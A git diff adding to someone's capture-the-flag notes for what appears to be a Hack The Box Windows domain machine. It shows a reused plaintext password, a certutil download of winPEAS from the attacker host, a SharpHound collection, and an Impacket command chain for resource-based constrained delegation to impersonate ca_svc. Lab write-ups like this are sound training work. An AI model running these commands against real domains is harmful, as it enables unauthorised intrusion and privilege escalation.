@@ -123,5 +123,49 @@ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/sql_s
 
 ```
 
-## Ryan reused his credentials from `sql_svc`!
+## Ryan reused his credentials from `sql_svc!
+
 ryan:WqSZAF6CysDQbGb3
+
+^^ This allows us to get the user flag
+
+## Get Winpeas on the machine:
+`certutil -urlcache -split -f http://10.10.16.2/winPEASx64.exe C:\Users\Public\winpeasx64.exe
+`
+
+![[Pasted image 20250618225114.png]]
+
+==SharpHound.exe location:== /opt/redteam/BloodHound-win32-x64/resources/app/Collectors/SharpHound.exe
+
+Ran sharphound and transferred it back to my attacker machine with `download` from winrm
+
+neo4j password: neo4j:david
+
+bloodhound password: Sc458849282!
+
+# Ryan has `writeOwner` on ca_svc:
+
+^^ Which means we can conduct Resource-Based Constrained Delegation (RBCD)
+![[Pasted image 20250619230802.png]]
+## Plan of attack on above:
+- Utilize Resource-Based Constrained Delegation to take control of ca_svc
+```shell
+
+python3 /usr/share/doc/python3-impacket/examples/addcomputer.py Sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -computer-name FAKECOMPUTER$ -computer-pass 'Password123!'
+# Create a new computer 
+
+python3 /usr/share/doc/python3-impacket/examples/rbcd.py SEQUEL.HTB/ryan:WqSZAF6CysDQbGb3 -delegate-to ca_svc -delegate-from FAKECOMPUTER$ -dc-ip 10.10.11.51
+# Tell ca_svc to trust the new fakecomputer
+
+python3 /usr/share/doc/python3-impacket/examples/getST.py SEQUEL.HTB/FAKECOMPUTER$:'Password123!' -impersonate ca_svc -dc-ip 10.10.11.51 -self
+# Capture the hash of ca_svc
+
+
+
+```
+
+
+
+ca_svc is a member of CERT_PUBLISHERS
+![[Pasted image 20250619230847.png]]
+
